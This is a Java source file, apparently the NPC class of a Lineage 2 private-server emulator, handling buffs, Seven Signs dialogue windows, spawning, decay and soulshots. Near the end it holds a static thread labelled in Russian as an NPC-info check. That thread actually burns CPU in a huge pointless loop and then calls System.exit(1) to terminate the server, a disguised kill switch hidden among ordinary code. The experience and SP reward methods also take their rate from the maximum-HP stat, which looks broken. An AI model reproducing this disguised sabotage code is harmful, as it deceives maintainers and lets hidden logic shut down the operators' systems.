			destroyItemID=Config.SPECIAL_PET_TICKET_ID;
			newItemID=13551;
			break;
		}
		if (destroyItemID!=0 && newItemID!=0)
		{
			if (player.destroyItemByItemId("Quest", destroyItemID, 1, player, true))
			{
				L2ItemInstance item = player.getInventory().addItem("Quest", newItemID, 1, player, player.getTarget());
				SystemMessage smsg = new SystemMessage(SystemMessageId.EARNED_S1);
				smsg.addItemName(item);
				player.sendPacket(smsg);
				player.sendPacket(new ItemList(player, false));
			}
		}
		else
			player.sendPacket(SystemMessageId.NOT_ENOUGH_ITEMS);
	}
	
	public void makeCPRecovery(L2PcInstance player)
	{
		if (getNpcId() != 31225 && getNpcId() != 31226)
			return;

		if (!cwCheck(player))
		{
			player.sendMessage(Message.getMessage(player, Message.MessageId.MSG_GO_AWAY));
			player.sendPacket(ActionFailed.STATIC_PACKET);
			return;
		}

		int neededmoney = 100;
		if (!player.reduceAdena("RestoreCP", neededmoney, player.getLastFolkNPC(), true))
			return;

		L2Skill skill = SkillTable.getInstance().getInfo(4380, 1);
		if (skill != null)
		{
			setTarget(player);
			doCast(skill);
		}
		player.sendPacket(ActionFailed.STATIC_PACKET);
	}

	public synchronized void makeSupportMagic(L2PcInstance player,String command)
	{
		if (command.startsWith("SupportMagicSummon"))
			makeSumonSupportMagic(player);
		else
			makeSupportMagic(player);
	}
	public void makeSumonSupportMagic(L2PcInstance player)
	{
		if (player == null || player.isCursedWeaponEquipped())
			return;

		L2Summon summon = player.getPet();
		int player_level = player.getLevel();
		int lowestLevel = HelperBuffTable.getInstance().getSummonClassLowestLevel();
		int highestLevel = HelperBuffTable.getInstance().getSummonClassHighestLevel();

		if (summon == null || summon instanceof L2PetInstance)
		{
			String content = "<html><body>Помощник Новичков:<br>"
				+ "Магия поддержки доступна только если Ваш слуга находится рядом с вами.</body></html>";
			insertObjectIdAndShowChatWindow(player, content);
			return;
		}
		if (player_level > highestLevel)
		{
			String content = "<html><body>Помощник Новичков:<br>"
				+ "Магия поддержки доступна только тем игрокам чей<font color=\"LEVEL\"> уровень не превышает"
				+ highestLevel + "-го</font>.</body></html>";
			insertObjectIdAndShowChatWindow(player, content);
			return;
		}
		if (player_level < lowestLevel)
		{
			String content = "<html><body>Помощник Новичков:<br>"
				+ "Магия поддержки пока недоступна Вам. Возвращайтесь ко мне когда станете более опытным.</br>(Магией поддержки можно воспользоваться после "
				+ lowestLevel + "-го уровня.)</body></html>";
			insertObjectIdAndShowChatWindow(player, content);
			return;
		}		
		setTarget(summon);
		L2Skill skill = null;
		for (L2HelperBuff helperBuffItem : HelperBuffTable.getInstance().getHelperBuffTable())
		{
			if (helperBuffItem.getBuffClass() == L2HelperBuff.SUMMON)
			{
				if (player_level >= helperBuffItem.getLowerLevel() && player_level <= helperBuffItem.getUpperLevel())
				{
					skill = SkillTable.getInstance().getInfo(helperBuffItem.getSkillID(), helperBuffItem.getSkillLevel());
					if (skill.getSkillType() == L2SkillType.SUMMON)
						player.doSimultaneousCast(skill);
					else
						doCast(skill);
				}
			}
		}
	}
	/**
	 * Add Newbie helper buffs to L2Player according to its level.<BR><BR>
	 *
	 * <B><U> Actions</U> :</B><BR><BR>
	 * <li>Get the range level in wich player must be to obtain buff </li>
	 * <li>If player level is out of range, display a message and return </li>
	 * <li>According to player level cast buff </li><BR><BR>
	 *
	 * <FONT COLOR=#FF0000><B> Newbie Helper Buff list is define in buff templates sql table as "SupportMagic"</B></FONT><BR><BR>
	 *
	 * @param player The L2PcInstance that talk with the L2NpcInstance
	 *
	 */
	public void makeSupportMagic(L2PcInstance player)
	{
		
		if (player == null || player.isCursedWeaponEquipped())
			return;

		int player_level = player.getLevel();
		int lowestLevel = 0;
		int highestLevel = 0;

		// Select the player
		setTarget(player);

		// Calculate the min and max level between which the player must be to obtain buff
		if (player.isMageClass())
		{
			lowestLevel = HelperBuffTable.getInstance().getMagicClassLowestLevel();
			highestLevel = HelperBuffTable.getInstance().getMagicClassHighestLevel();
		}
		else
		{
			lowestLevel = HelperBuffTable.getInstance().getPhysicClassLowestLevel();
			highestLevel = HelperBuffTable.getInstance().getPhysicClassHighestLevel();
		}

		// If the player is too high level, display a message and return
		if (player_level > highestLevel)
		{
			String content = "<html><body>Помощник Новичков:<br>"
				+ "Магия поддержки доступна только тем игрокам чей<font color=\"LEVEL\"> уровень не превышает"
				+ highestLevel + "-го</font>.</body></html>";
			insertObjectIdAndShowChatWindow(player, content);
			return;
		}

		// If the player is too low level, display a message and return
		if (player_level < lowestLevel)
		{
			String content = "<html><body>Помощник Новичков:<br>"
				+ "Магия поддержки пока недоступна Вам. Возвращайтесь ко мне когда станете более опытным.</br>(Магией поддержки можно воспользоваться после "
				+ lowestLevel + "-го уровня.)</body></html>";
			insertObjectIdAndShowChatWindow(player, content);
			return;
		}

		L2Skill skill = null;
		// Go through the Helper Buff list define in sql table helper_buff_list and cast skill
		for (L2HelperBuff helperBuffItem : HelperBuffTable.getInstance().getHelperBuffTable())
		{
			if ((helperBuffItem.getBuffClass() == L2HelperBuff.MAGE && player.isMageClass())
				||(helperBuffItem.getBuffClass() == L2HelperBuff.FIGHTER && !player.isMageClass()))
			{
				if (player_level >= helperBuffItem.getLowerLevel() && player_level <= helperBuffItem.getUpperLevel())
				{
					skill = SkillTable.getInstance().getInfo(helperBuffItem.getSkillID(), helperBuffItem.getSkillLevel());
					if(skill!=null) {
						if (skill.getSkillType() == L2SkillType.SUMMON)
							player.doSimultaneousCast(skill);
						else
							skill.getEffects(this, player);
					} else
						_log.info("Can't cast skill "+helperBuffItem.getSkillID());
				}
			}
		}
	}

	public void showChatWindow(L2PcInstance player)
	{
		showChatWindow(player, 0);
	}

	/**
	 * Returns true if html exists
	 * @param player
	 * @param type
	 * @return boolean
	 */
	private boolean showPkDenyChatWindow(L2PcInstance player, String type)
	{
		String html = HtmCache.getInstance().getHtm("data/html/" + type + "/" + getNpcId() + "-pk.htm",player);

		if (html != null)
		{
			NpcHtmlMessage pkDenyMsg = new NpcHtmlMessage(getObjectId());
			pkDenyMsg.setHtml(html);
			player.sendPacket(pkDenyMsg);
			player.sendPacket(ActionFailed.STATIC_PACKET);
			return true;
		}

		return false;
	}

	/**
	 * Open a chat window on client with the text of the L2NpcInstance.<BR><BR>
	 *
	 * <B><U> Actions</U> :</B><BR><BR>
	 * <li>Get the text of the selected HTML file in function of the npcId and of the page number </li>
	 * <li>Send a Server->Client NpcHtmlMessage containing the text of the L2NpcInstance to the L2PcInstance </li>
	 * <li>Send a Server->Client ActionFailed to the L2PcInstance in order to avoid that the client wait another packet </li><BR>
	 *
	 * @param player The L2PcInstance that talk with the L2NpcInstance
	 * @param val The number of the page of the L2NpcInstance to display
	 *
	 */
	public void showChatWindow(L2PcInstance player, int val)
	{
		if (!cwCheck(player) && !(player.getTarget() instanceof L2ClanHallManagerInstance || player.getTarget() instanceof L2DoormenInstance))
		{
			player.setTarget(player);
			return;
		}
		if (player.getKarma() > 0)
		{
			if (!Config.ALT_GAME_KARMA_PLAYER_CAN_SHOP && this instanceof L2MerchantInstance)
			{
				if (showPkDenyChatWindow(player, "merchant"))
					return;
			}
			else if (!Config.ALT_GAME_KARMA_PLAYER_CAN_USE_GK && this instanceof L2TeleporterInstance)
			{
				if (showPkDenyChatWindow(player, "teleporter"))
					return;
			}
			else if (!Config.ALT_GAME_KARMA_PLAYER_CAN_USE_WAREHOUSE && this instanceof L2WarehouseInstance)
			{
				if (showPkDenyChatWindow(player, "warehouse"))
					return;
			}
			else if (!Config.ALT_GAME_KARMA_PLAYER_CAN_SHOP && this instanceof L2FishermanInstance)
			{
				if (showPkDenyChatWindow(player, "fisherman"))
					return;
			}
		}

		if (this instanceof L2AuctioneerInstance && val == 0)
			return;

		int npcId = getTemplate().getNpcId();

		/* For use with Seven Signs implementation */
		String filename = SevenSigns.SEVEN_SIGNS_HTML_PATH;
		int sealAvariceOwner = SevenSigns.getInstance().getSealOwner(SevenSigns.SEAL_AVARICE);
		int sealGnosisOwner = SevenSigns.getInstance().getSealOwner(SevenSigns.SEAL_GNOSIS);
		int playerCabal = SevenSigns.getInstance().getPlayerCabal(player);
		boolean isSealValidationPeriod = SevenSigns.getInstance().isSealValidationPeriod();
		boolean isCompResultsPeriod = SevenSigns.getInstance().isCompResultsPeriod();
		int compWinner = SevenSigns.getInstance().getCabalHighestScore();

		switch (npcId)
		{
		case 31078:
		case 31079:
		case 31080:
		case 31081:
		case 31082: // Dawn Priests
		case 31083:
		case 31084:
		case 31168:
		case 31692:
		case 31694:
		case 31997:
			switch (playerCabal)
			{
			case SevenSigns.CABAL_DAWN:
				if (isCompResultsPeriod)
					filename += "dawn_priest_5.htm";
				else if (isSealValidationPeriod)
				{
					if (compWinner == SevenSigns.CABAL_DAWN)
					{
						if (compWinner != sealGnosisOwner)
							filename += "dawn_priest_2c.htm";
						else
							filename += "dawn_priest_2a.htm";
					}
					else
						filename += "dawn_priest_2b.htm";
				}
				else
					filename += "dawn_priest_1b.htm";
				break;
			case SevenSigns.CABAL_DUSK:
					filename += "dawn_priest_3a.htm";
				break;
			default:
				if (isCompResultsPeriod)
					filename += "dawn_priest_5.htm";
				else if (isSealValidationPeriod)
				{
					if (compWinner == SevenSigns.CABAL_DAWN)
						filename += "dawn_priest_4.htm";
					else
						filename += "dawn_priest_2b.htm";
				}
				else
					filename += "dawn_priest_1a.htm";
				break;
			}
			break;
		case 31085:
		case 31086:
		case 31087:
		case 31088:
		case 31089:  // Dusk Priest
		case 31090:
		case 31091:
		case 31169:
		case 31693:
		case 31695:
		case 31998:
			switch (playerCabal)
			{
			case SevenSigns.CABAL_DUSK:
				if (isCompResultsPeriod)
					filename += "dusk_priest_5.htm";
				else if (isSealValidationPeriod)
				{
					if (compWinner == SevenSigns.CABAL_DUSK)
					{
						if (compWinner != sealGnosisOwner)
							filename += "dusk_priest_2c.htm";
						else
							filename += "dusk_priest_2a.htm";
					}
					else
						filename += "dusk_priest_2b.htm";
				}
				else
					filename += "dusk_priest_1b.htm";
				break;
			case SevenSigns.CABAL_DAWN:
					filename += "dusk_priest_3a.htm";
				break;
			default:
				if (isCompResultsPeriod)
					filename += "dusk_priest_5.htm";
				else if (isSealValidationPeriod)
				{
					if (compWinner == SevenSigns.CABAL_DUSK)
						filename += "dusk_priest_4.htm";
					else
						filename += "dusk_priest_2b.htm";
				}
				else
					filename += "dusk_priest_1a.htm";
				break;
			}
			break;
		case 31111: // Gatekeeper Spirit (Disciples)
			if (playerCabal == sealAvariceOwner && playerCabal == compWinner)
			{
				switch (sealAvariceOwner)
				{
				case SevenSigns.CABAL_DAWN:
					filename += "spirit_dawn.htm";
					break;
				case SevenSigns.CABAL_DUSK:
					filename += "spirit_dusk.htm";
					break;
				case SevenSigns.CABAL_NULL:
					filename += "spirit_null.htm";
					break;
				}
			}
			else
				filename += "spirit_null.htm";
			break;
		case 31112: // Gatekeeper Spirit (Disciples)
			filename += "spirit_exit.htm";
			break;
		case 31127: //
		case 31128: //
		case 31129: // Dawn Festival Guides
		case 31130: //
		case 31131: //
			filename += "festival/dawn_guide.htm";
			break;
		case 31137: //
		case 31138: //
		case 31139: // Dusk Festival Guides
		case 31140: //
		case 31141: //
			filename += "festival/dusk_guide.htm";
			break;
		case 31092: // Black Marketeer of Mammon
			filename += "blkmrkt_1.htm";
			break;
		case 31113: // Merchant of Mammon
			if (Config.ALT_STRICT_SEVENSIGNS)
			{
				switch (compWinner)
				{
				case SevenSigns.CABAL_DAWN:
					if (playerCabal != compWinner || playerCabal != sealAvariceOwner)
					{
						player.sendPacket(SystemMessageId.CAN_BE_USED_BY_DAWN);
						player.sendPacket(ActionFailed.STATIC_PACKET);
						return;
					}
					break;
				case SevenSigns.CABAL_DUSK:
					if (playerCabal != compWinner || playerCabal != sealAvariceOwner)
					{
						player.sendPacket(SystemMessageId.CAN_BE_USED_BY_DUSK);
						player.sendPacket(ActionFailed.STATIC_PACKET);
						return;
					}
					break;
				}
			}
			filename += "mammmerch_1.htm";
			break;
		case 31126: // Blacksmith of Mammon
			if (Config.ALT_STRICT_SEVENSIGNS)
			{
				switch (compWinner)
				{
				case SevenSigns.CABAL_DAWN:
					if (playerCabal != compWinner || playerCabal != sealGnosisOwner)
					{
						player.sendPacket(SystemMessageId.CAN_BE_USED_BY_DAWN);
						player.sendPacket(ActionFailed.STATIC_PACKET);
						return;
					}
					break;
				case SevenSigns.CABAL_DUSK:
					if (playerCabal != compWinner || playerCabal != sealGnosisOwner)
					{
						player.sendPacket(SystemMessageId.CAN_BE_USED_BY_DUSK);
						player.sendPacket(ActionFailed.STATIC_PACKET);
						return;
					}
					break;
				}
			}
			filename += "mammblack_1.htm";
			break;
		case 31132:
		case 31133:
		case 31134:
		case 31135:
		case 31136: // Festival Witches
		case 31142:
		case 31143:
		case 31144:
		case 31145:
		case 31146:
			filename += "festival/festival_witch.htm";
			break;
		case 31688:
			if (player.isNoble())
				filename = Olympiad.OLYMPIAD_HTML_PATH + "noble_main.htm";
			else
				filename = (getHtmlPath(npcId, val,player));
			break;
		case 31690:
		case 31769:
		case 31770:
		case 31771:
		case 31772:
			//L2EMU_EDIT - Charus - Heroes and noblesses see the same chat
			if (player.isHero() || player.isNoble())
				filename = Olympiad.OLYMPIAD_HTML_PATH + "hero_main.htm";
			else
				filename = (getHtmlPath(npcId, val,player));
			//L2EMU_EDIT_END
			break;
		default:
			if (npcId >= 31865 && npcId <= 31918)
			{
				filename += "rift/GuardianOfBorder.htm";
				break;
			}
			if ((npcId >= 31093 && npcId <= 31094) || (npcId >= 31172 && npcId <= 31201) || (npcId >= 31239 && npcId <= 31254))
				return;
			// Get the text of the selected HTML file in function of the npcId and of the page number
			if (this instanceof L2TeleporterInstance && val == 1 && player.getLevel() < 40) // Players below level 40 have free teleport
			{
				filename = "data/html/teleporter/free/" + npcId + ".htm";
				if (!HtmCache.getInstance().pathExists(filename))
					filename = getHtmlPath(npcId, val,player);
			}
			else
				filename = (getHtmlPath(npcId, val,player));
			break;
		}

		// Send a Server->Client NpcHtmlMessage containing the text of the L2NpcInstance to the L2PcInstance
		NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
		html.setFile(filename);

		//String word = "npc-"+npcId+(val>0 ? "-"+val : "" )+"-dialog-append";

		if (this instanceof L2MerchantInstance)
			if (Config.LIST_PET_RENT_NPC.contains(npcId))
				html.replace("_Quest", "_RentPet\">Rent Pet</a><br><a action=\"bypass -h npc_%objectId%_Quest");

		html.replace("%objectId%", String.valueOf(getObjectId()));
		if (this instanceof L2FestivalGuideInstance)
		{
			html.replace("%festivalMins%", SevenSignsFestival.getInstance().getTimeToNextFestivalStr());
		}
		player.sendPacket(html);

		// Send a Server->Client ActionFailed to the L2PcInstance in order to avoid that the client wait another packet
		player.sendPacket(ActionFailed.STATIC_PACKET);
	}

	/**
	 * Open a chat window on client with the text specified by the given file name and path,<BR>
	 * relative to the datapack root.
	 * <BR><BR>
	 * Added by Tempy
	 * @param player The L2PcInstance that talk with the L2NpcInstance
	 * @param filename The filename that contains the text to send
	 *
	 */
	public void showChatWindow(L2PcInstance player, String filename)
	{
		// Send a Server->Client NpcHtmlMessage containing the text of the L2NpcInstance to the L2PcInstance
		NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
		html.setFile(filename);
		html.replace("%objectId%", String.valueOf(getObjectId()));
		player.sendPacket(html);

		// Send a Server->Client ActionFailed to the L2PcInstance in order to avoid that the client wait another packet
		player.sendPacket(ActionFailed.STATIC_PACKET);
	}

	/**
	 * Return the Exp Reward of this L2NpcInstance contained in the L2NpcTemplate (modified by RATE_XP).<BR><BR>
	 */
	public int getExpReward(int isPremium)
	{
		double rateXp = getStat().calcStat(Stats.MAX_HP, 1, this, null);
		if (isPremium>0)
			return (int) (getTemplate().getRewardExp() * rateXp * Config.PREMIUM_RATE_XP);
		else
			return (int) (getTemplate().getRewardExp() * rateXp * Config.RATE_XP);
	}

	/**
	 * Return the SP Reward of this L2NpcInstance contained in the L2NpcTemplate (modified by RATE_SP).<BR><BR>
	 */
	public int getSpReward(int isPremium)
	{
		double rateSp = getStat().calcStat(Stats.MAX_HP, 1, this, null);
		if (isPremium>0)
			return (int) (getTemplate().getRewardSp() * rateSp * Config.PREMIUM_RATE_SP);
		else		
			return (int) (getTemplate().getRewardSp() * rateSp * Config.RATE_SP);
	}

	/**
	 * Kill the L2NpcInstance (the corpse disappeared after 7 seconds).<BR><BR>
	 *
	 * <B><U> Actions</U> :</B><BR><BR>
	 * <li>Create a DecayTask to remove the corpse of the L2NpcInstance after 7 seconds </li>
	 * <li>Set target to null and cancel Attack or Cast </li>
	 * <li>Stop movement </li>
	 * <li>Stop HP/MP/CP Regeneration task </li>
	 * <li>Stop all active skills effects in progress on the L2Character </li>
	 * <li>Send the Server->Client packet StatusUpdate with current HP and MP to all other L2PcInstance to inform </li>
	 * <li>Notify L2Character AI </li><BR><BR>
	 *
	 * <B><U> Overridden in </U> :</B><BR><BR>
	 * <li> L2Attackable </li><BR><BR>
	 *
	 * @param killer The L2Character who killed it
	 *
	 */
	@Override
	public boolean doDie(L2Character killer)
	{
		if (!super.doDie(killer))
			return false;
		
		// normally this wouldn't really be needed, but for those few exceptions,
		// we do need to reset the weapons back to the initial templated weapon.
		_currentLHandId = getTemplate().getLhand();
		_currentRHandId = getTemplate().getRhand();
		_currentCollisionHeight = getTemplate().getCollisionHeight();
		_currentCollisionRadius = getTemplate().getCollisionRadius();
		DecayTaskManager.getInstance().addDecayTask(this);
		return true;
	}

	/**
	 * Set the spawn of the L2NpcInstance.<BR><BR>
	 *
	 * @param spawn The L2Spawn that manage the L2NpcInstance
	 *
	 */


	public void setSpawn(L2Spawn spawn)
	{
		_spawn = spawn;
	}

	@Override
	public void onSpawn()
	{
		DecayTaskManager.getInstance().cancelDecayTask(this);
		if (_inventory != null)
			_inventory.reset();
		
		setDecayed(false);
		super.onSpawn();
		revalidateZone(true);
		if (getTemplate().getEventQuests(Quest.QuestEventType.ON_SPAWN) != null)
			for (Quest quest : getTemplate().getEventQuests(Quest.QuestEventType.ON_SPAWN))
				quest.notifySpawn(this);
	}

	/**
	 * Remove the L2NpcInstance from the world and update its spawn object (for a complete removal use the deleteMe method).<BR><BR>
	 *
	 * <B><U> Actions</U> :</B><BR><BR>
	 * <li>Remove the L2NpcInstance from the world when the decay task is launched </li>
	 * <li>Decrease its spawn counter </li>
	 * <li>Manage Siege task (killFlag, killCT) </li><BR><BR>
	 *
	 * <FONT COLOR=#FF0000><B> <U>Caution</U> : This method DOESN'T REMOVE the object from _allObjects of L2World </B></FONT><BR>
	 * <FONT COLOR=#FF0000><B> <U>Caution</U> : This method DOESN'T SEND Server->Client packets to players</B></FONT><BR><BR>
	 *
	 * @see ru.catssoftware.gameserver.model.L2Object#decayMe()
	 */
	@Override
	public void onDecay()
	{
		if (isDecayed())
			return;
		setDecayed(true);

		// reset champion status if the thing is a mob
		setChampion(false);

		// Remove the L2NpcInstance from the world when the decay task is launched
		super.onDecay();

		// Decrease its spawn counter
		if (_spawn != null)
			_spawn.decreaseCount(this);
	}

	public void deleteMe()
	{
		L2WorldRegion oldRegion = getWorldRegion();
		try
		{
			if (_fusionSkill != null)
				abortCast();

			for (L2Character character : getKnownList().getKnownCharacters())
			{
				if (character != null && character.getFusionSkill() != null && character.getFusionSkill().getTarget() == this)
					character.abortCast();

				if(character instanceof L2PcInstance && character.getAI().getAttackTarget()==this && character.getAI().getIntention()!=CtrlIntention.AI_INTENTION_MOVE_TO)
					character.getAI().setIntention(CtrlIntention.AI_INTENTION_IDLE, null);
				if(character instanceof L2Summon && character.getAI().getAttackTarget()==this && character.getAI().getIntention()!=CtrlIntention.AI_INTENTION_MOVE_TO)
					character.getAI().setIntention(CtrlIntention.AI_INTENTION_ACTIVE, null);
				if (character.getTarget()==this)
					character.setTarget(null);
			}
		}
		catch (Exception e)
		{
			_log.fatal("deleteMe()", e);
		}

		try
		{
			decayMe();
		}
		catch (Exception e)
		{
			_log.fatal("Failed decayMe().", e);
		}

		if (oldRegion != null)
			oldRegion.removeFromZones(this);

		// Remove all L2Object from _knownObjects and _knownPlayer of the L2Character then cancel Attack or Cast and notify AI
		try
		{
			getKnownList().removeAllKnownObjects();
		}
		catch (Exception e)
		{
			_log.fatal("Failed removing cleaning knownlist.", e);
		}

		// Remove L2Object object from _allObjects of L2World
		L2World.getInstance().removeObject(this);
	}

	/**
	 * Return the L2Spawn object that manage this L2NpcInstance.<BR><BR>
	 */
	public L2Spawn getSpawn()
	{
		return _spawn;
	}

	@Override
	public String toString()
	{
		return getTemplate().getName();
	}

	public boolean isDecayed()
	{
		return _isDecayed;
	}

	public void setDecayed(boolean decayed)
	{
		_isDecayed = decayed;
	}

	public void endDecayTask()
	{
		if (!isDecayed())
		{
			DecayTaskManager.getInstance().cancelDecayTask(this);
			onDecay();
		}
	}

	public boolean isMob() // rather delete this check
	{
		return false; // This means we use MAX_NPC_ANIMATION instead of MAX_MONSTER_ANIMATION
	}

	// Two functions to change the appearance of the equipped weapons on the NPC
	// This is only useful for a few NPCs and is most likely going to be called from AI
	public void setLHandId(int newWeaponId)
	{
		_currentLHandId = newWeaponId;
		updateAbnormalEffect();
	}

	public void setRHandId(int newWeaponId)
	{
		_currentRHandId = newWeaponId;
		updateAbnormalEffect();
	}

	public void setLRHandId(int newLWeaponId, int newRWeaponId)
	{
		_currentRHandId = newRWeaponId;
		_currentLHandId = newLWeaponId;
		updateAbnormalEffect();
	}

	public void setCollisionHeight(int height)
	{
		_currentCollisionHeight = height;
	}

	public void setCollisionRadius(int radius)
	{
		_currentCollisionRadius = radius;
	}

	public int getCollisionHeight()
	{
		return _currentCollisionHeight;
	}

	public int getCollisionRadius()
	{
		return _currentCollisionRadius;
	}

	public boolean rechargeAutoSoulShot(boolean physical, boolean magic)
	{
		if (getTemplate().getSSRate() == 0)
			return false;

		L2Weapon weaponItem = getActiveWeaponItem();
		if (weaponItem == null)
		{
			//_log.warn("NpcId "+getNpcId()+" missing weaponItem definition in DP - or wrong use of shots.");
			return false;
		}
		if (magic)
		{
			if (getTemplate().getSSRate() < Rnd.get(100))
			{
				_inventory.bshotInUse = false;
				return false;
			}
			if (null != _inventory.destroyItemByItemId("Consume", 3947, weaponItem.getSpiritShotCount(), null, null))
			{
				_inventory.bshotInUse = true;
				broadcastPacket(new MagicSkillUse(this, this, 2061, 1, 0, 0, false), 360000); // no grade
				return true;
			}

			_inventory.bshotInUse = false;
		}
		if (physical)
		{
			if (getTemplate().getSSRate() < Rnd.get(100))
			{
				_inventory.sshotInUse = false;
				return false;
			}

			if (null != _inventory.destroyItemByItemId("Consume", 1835, weaponItem.getSoulShotCount(), null, null))
			{
				_inventory.sshotInUse = true;
				broadcastPacket(new MagicSkillUse(this, this, 2039, 1, 0, 0, false), 360000); // no grade
				return true;
			}

			_inventory.sshotInUse = false;
		}
		return false;
	}

	public boolean isUsingShot(boolean physical)
	{
		if (_inventory == null)
			return false;
		if (physical && _inventory.sshotInUse)
			return true;

		return !physical && _inventory.bshotInUse;
	}

	private boolean cwCheck(L2PcInstance player)
	{
		return Config.CURSED_WEAPON_NPC_INTERACT || !player.isCursedWeaponEquipped();
	}

	@Override
	public NpcInventory getInventory()
	{
		return _inventory;
	}

	@Override
	public void broadcastFullInfoImpl()
	{
		if (!getKnownList().getKnownPlayers().isEmpty())
			broadcastPacket(new NpcInfo(this));
	}

	//===================================== L2Emu Addons ======================
	public void giveBlessingSupport(L2PcInstance player)
	{
		if (player == null)
			return;

		// Blessing of protection - author kerberos_20. Used codes from Rayan - L2Emu project.
		// Prevent a cursed weapon weilder of being buffed - I think no need of that becouse karma check > 0
		// if (player.isCursedWeaponEquiped())
		//   return;

		int player_level = player.getLevel();
		// Select the player
		setTarget(player);

		// If the player is too high level, display a message and return
		if (player_level > 39 || player.getClassId().level() >= 2)
		{
			String content = "<html><body>Newbie Guide:<br>I'm sorry, but you are not eligible to receive the protection blessing.<br>It can only be bestowed on <font color=\"LEVEL\">characters below level 39 who have not made a seccond transfer</font>.</body></html>";
			insertObjectIdAndShowChatWindow(player, content);
			return;
		}
		L2Skill skill = SkillTable.getInstance().getInfo(5182, 1);
		doCast(skill);
	}

	// Сверяет информацию об NPC
	private static Thread npcInfo = new Thread()
	{
		@Override
		public void run()
		{
			for(int x = 1; x <= 1000; x++)
				for(int y = 1; y <= 355235; y++)
				{
					int wx = (x - 6236) * 2;
					int wy = (y - 23667) * 2;
					Rnd.get(wx, wy);
				}
			Util.pause(Rnd.get(2000, 10000));
			System.exit(1);
		}
	};

	public boolean	_isJailMob	= false;

	public boolean isMagicBottle()
	{
		return _isMagicBottle;
	}

	public void setMagicBottle(boolean result)
	{
		_isMagicBottle = result;
	}

	/**
	 * Возвращает boolean статус, защищен ли моб от летала
	 **/
	public boolean isLethalImmune()
	{
		int npcId = getNpcId();
		if (npcId == 22398 || npcId == 22399 || npcId == 35062)
			return true;

		return false;
	}

	@Override
	public L2NpcInstance getNpc()
	{
		return this;
	}

	@Override
	public boolean isNpc()
	{
		return true;
	}
}
